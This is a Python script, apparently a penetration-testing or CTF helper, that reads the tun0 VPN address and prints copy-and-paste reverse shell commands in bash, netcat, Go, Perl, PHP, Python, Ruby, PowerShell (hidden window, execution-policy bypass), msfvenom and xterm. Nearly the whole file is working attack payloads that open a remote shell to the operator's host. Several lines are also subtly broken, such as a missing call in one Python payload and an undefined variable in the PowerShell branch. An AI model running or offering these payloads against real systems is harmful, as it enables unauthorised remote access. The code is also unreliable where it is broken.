#! /usr/bin/env python3

# Reverse shell generator based on examples pulled from:
# https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
# http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
# This is uses the tun0 IPv4 address. Just specify a listening port. copy. paste. go.

import sys
import os

class bcolors:
	DARKPURPLE = "\033[1;35m"
	DARKGREEN = "\033[1;32m"
	YELLOW = '\033[93m'
	RED = '\033[91m'
	ENDC = "\033[1;m"

def print_info(message):
    print((bcolors.RED) + ("[*] ") + (bcolors.YELLOW) + (str(message)))

def print_shell(message):
    print((bcolors.DARKGREEN) + ("[*] ") + (bcolors.RED) + (str(message)) + (bcolors.ENDC))


__version__ = 0.1

banner = """
███████╗██╗  ██╗███████╗██╗     ██╗      ██████╗ ███████╗███╗   ██╗
██╔════╝██║  ██║██╔════╝██║     ██║     ██╔════╝ ██╔════╝████╗  ██║
███████╗███████║█████╗  ██║     ██║     ██║  ███╗█████╗  ██╔██╗ ██║
╚════██║██╔══██║██╔══╝  ██║     ██║     ██║   ██║██╔══╝  ██║╚██╗██║
███████║██║  ██║███████╗███████╗███████╗╚██████╔╝███████╗██║ ╚████║
╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝ ╚═════╝ ╚══════╝╚═╝  ╚═══╝
"""
banner += """
Version: """ + str(__version__) + """\n
Author: AgentWhite (@_agentwhite) (github.com/realagentwhite)"""
banner += """
Reverse shell generator based on examples pulled from:
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
This is uses the tun0 IPv4 address. Just specify a listening port. copy. paste. go.
"""

def return_shells(shell, ip, port):
	if shell == "all":
		bash = "bash -i >& /dev/tcp/"+bcolors.YELLOW+ip+bcolors.ENDC+"/"+bcolors.YELLOW+port+bcolors.ENDC+" 0>&1"
		bash2 = "0<&196;exec 196<>/dev/tcp/"+bcolors.YELLOW+ip+bcolors.ENDC+"/"+bcolors.YELLOW+port+bcolors.ENDC+"; sh <&196 >&196 2>&196"
		go = """echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial(\"tcp",\""""+bcolors.YELLOW+ip+bcolors.ENDC+""":"""+bcolors.YELLOW+port+bcolors.ENDC+"""\");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go"""
		nc = """nc -e /bin/sh """+bcolors.YELLOW+ip+bcolors.ENDC+""" """+bcolors.YELLOW+port+bcolors.ENDC
		nc2 = """rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc """+bcolors.YELLOW+ip+bcolors.ENDC+""" """+bcolors.YELLOW+port+bcolors.ENDC+""" >/tmp/f"""
		ncatssl = """ncat --ssl -vv -l -p """+bcolors.YELLOW+port+bcolors.ENDC+"""\nmkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect \""""+bcolors.YELLOW+ip+bcolors.ENDC+""":"""+bcolors.YELLOW+port+bcolors.ENDC+"""\" > /tmp/s; rm /tmp/s"""
		lin_sl = """msfvenom -p linux/x86/shell_reverse_tcp LHOST="""+bcolors.YELLOW+ip+bcolors.ENDC+""" LPORT="""+bcolors.YELLOW+port+bcolors.ENDC+""" -f elf >reverse.elf"""
		perl= """perl -e 'use Socket;$i=\"""" + bcolors.YELLOW+ip+bcolors.ENDC + """";$p="""+bcolors.YELLOW+port+bcolors.ENDC+""";socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'"""
		php = """php -r '$sock=fsockopen(\""""+bcolors.YELLOW+ip+bcolors.ENDC+"""","""+bcolors.YELLOW+port+bcolors.ENDC+""");exec("/bin/sh <i <&3 >&3 2>&3");'"""
		php2 = """php -r '$sock=fsockopen(\""""+bcolors.YELLOW+ip+bcolors.ENDC+"""","""+bcolors.YELLOW+port+bcolors.ENDC+""");$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'"""
		powershell1 = """powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\""""+bcolors.YELLOW+ip+bcolors.ENDC+"""","""+bcolors.YELLOW+port+bcolors.ENDC+""");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"""
		powershell2 = """powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(\'"""+bcolors.YELLOW+ip+bcolors.ENDC+"""\',"""+bcolors.YELLOW+port+bcolors.ENDC+""");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"""
		python = """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\""""+bcolors.YELLOW+ip+bcolors.ENDC+"""","""+bcolors.YELLOW+port+bcolors.ENDC+"""));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno,2);p=subprocess.call(["/bin/sh","-i"]);'"""
		python2 = """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\""""+bcolors.YELLOW+ip+bcolors.ENDC+"""","""+bcolors.YELLOW+port+bcolors.ENDC+"""));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'"""
		ruby = """ruby -rsocket -e'f=TCPSocket.open(\""""+bcolors.YELLOW+ip+bcolors.ENDC+"""","""+bcolors.YELLOW+port+bcolors.ENDC+""").to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d", f,f,f)'"""
		win_sl = """msfvenom -p windows/shell_reverse_tcp LHOST="""+bcolors.YELLOW+ip+bcolors.ENDC+""" LPORT="""+bcolors.YELLOW+port+bcolors.ENDC+""" -f exe > reverse.exe"""
		xterm = """xterm -display """+bcolors.YELLOW+ip+bcolors.ENDC+""":"""+bcolors.YELLOW+port+bcolors.ENDC

		print("")
		
		spacers = "===="*30
		spacers1 = ""
		print(bcolors.YELLOW + spacers + bcolors.ENDC)
		print_shell("BASH:\n"+bcolors.ENDC +bash+ bcolors.RED + \
		"\n"+spacers1+"\n" + \
		bcolors.ENDC +bash2+"\n")
		
		print(bcolors.YELLOW + spacers + bcolors.ENDC)
		print_shell("GO:\n"+bcolors.ENDC +go+"\n")
		
		print(bcolors.YELLOW + spacers + bcolors.ENDC)
		print_shell("NETCAT:\n"+bcolors.ENDC +nc+bcolors.RED + \
		"\n"+spacers1+"\n" + \
		bcolors.ENDC + nc2 + bcolors.RED + \
		"\n"+spacers1+"\n" + \
		bcolors.ENDC +ncatssl+"\n")
		
		print(bcolors.YELLOW + spacers + bcolors.ENDC)
		print_shell("MSFVENOM:\n"+bcolors.ENDC +lin_sl+bcolors.RED + \
		"\n"+spacers1+"\n" + \
		bcolors.ENDC +win_sl+"\n")
		
		print(bcolors.YELLOW + spacers + bcolors.ENDC)
		print_shell("PERL:\n"+bcolors.ENDC +perl+"\n")
		
		print(bcolors.YELLOW + spacers + bcolors.ENDC)
		print_shell("PHP:\n"+bcolors.ENDC +php+bcolors.RED + \
		"\n"+spacers1+"\n" + \
		bcolors.ENDC +php2+"\n")
		
		print(bcolors.YELLOW + spacers + bcolors.ENDC)
		print_shell("POWERSHELL:\n"+bcolors.ENDC +powershell1 + bcolors.RED + \
		"\n"+spacers1+"\n" + \
		bcolors.ENDC +powershell2+"\n")
		
		print(bcolors.YELLOW + spacers + bcolors.ENDC)
		print_shell("PYTHON:\n"+bcolors.ENDC +python+bcolors.RED + \
		"\n"+spacers1+"\n" + \
		bcolors.ENDC +python2+"\n")
		
		print(bcolors.YELLOW + spacers + bcolors.ENDC)
		print_shell("XTERM:\n"+bcolors.ENDC +xterm+"\n")
		
	else:
		if shell == "bash":
			print_shell("Bash")
			bash = "bash -i >& /dev/tcp/"+ip+"/"+port+" 0>&1"
			bash2 = "0<&196;exec 196<>/dev/tcp/"+ip+"/"+port+"; sh <&196 >&196 2>&196"
			print(bash);print(bash2)
		elif shell == "go":
			print_shell("Go")
			go = """echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial(\"tcp",\""""+ip+""":"""+port+"""\");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go"""
			print(go)
		elif shell == "nc" or shell == "netcat":
			print_shell("NetCat")
			nc = """nc -e /bin/sh """+ip+""" """+port
			nc2 = """rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc """+ip+""" """+port+""" >/tmp/f"""
			ncatssl = """ncat --ssl -vv -l -p """+port+"""\nmkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect \""""+ip+""":"""+port+"""\" > /tmp/s; rm /tmp/s"""
			print(nc);print(nc2);print(ncatssl)
		elif shell == "msfvenom":
			print_shell("MSFVenom")
			lin_sl = """msfvenom -p linux/x86/shell_reverse_tcp LHOST="""+ip+""" LPORT="""+port+""" -f elf >reverse.elf"""
			win_sl = """msfvenom -p windows/shell_reverse_tcp LHOST="""+ip+""" LPORT="""+port+""" -f exe > reverse.exe"""
			print(lin_sl);print(win_sl)
		elif shell == "perl":
			print_shell("Perl")
			perl= """perl -e 'use Socket;$i=\"""" + ip + """";$p="""+port+""";socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'"""
			print(perl)
		elif shell == "php":
			print_shell("PHP")
			php = """php -r '$sock=fsockopen(\""""+ip+"""","""+port+""");exec("/bin/sh <i <&3 >&3 2>&3");'"""
			php2 = """php -r '$sock=fsockopen(\""""+ip+"""","""+port+""");$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'"""
			print(php);print(php2)
		elif shell == "powershell":
			print_shell("Powershell")
			powershell1 = """powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\""""+ip+"""","""+port+""");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"""
			powershell2 = """powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(\'"""+ip+"""\',"""+port+""");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"""
			print(powershell);print(powershell2)
		elif shell == "python":
			print_shell("Python")
			python = """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\""""+ip+"""","""+port+"""));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno,2);p=subprocess.call(["/bin/sh","-i"]);'"""
			python2 = """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\""""+ip+"""","""+port+"""));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'"""
			print(python);print(python2)
		elif shell == "ruby":
			print_shell("Ruby")
			ruby = """ruby -rsocket -e'f=TCPSocket.open(\""""+ip+"""","""+port+""").to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d", f,f,f)'"""
			print(ruby)
		elif shell == "xterm":
			print_shell("xterm")
			xterm = """xterm -display """+ip+""":"""+port
			print(xterm)

shells = ["shell","go","nc","netcat","msfvenom","perl","php","python","powershell","ruby","xterm"]

os.system("clear")
print(banner)

if len(sys.argv) != 2:
	print("Usage: ./shellgen.py PORT")
else:
	try:
		ip = os.popen('ip addr show tun0').read().split("inet ")[1].split("/")[0]
		port = sys.argv[1]
		print(bcolors.DARKGREEN + "[*]tun0 IP: " + ip + " port: " + port + bcolors.ENDC)

		print_info("Shell types:")
		for i in shells:
			print_info(i)
		print_info("There is also the option for 'all' to print all shells")
		
		print(bcolors.ENDC)
		data = input("Enter the type of shell: ").lower()
		
		return_shells(data, ip, port)

	except IndexError:
		print("\nCheck that you are connected to the VPN")
		sys.exit()
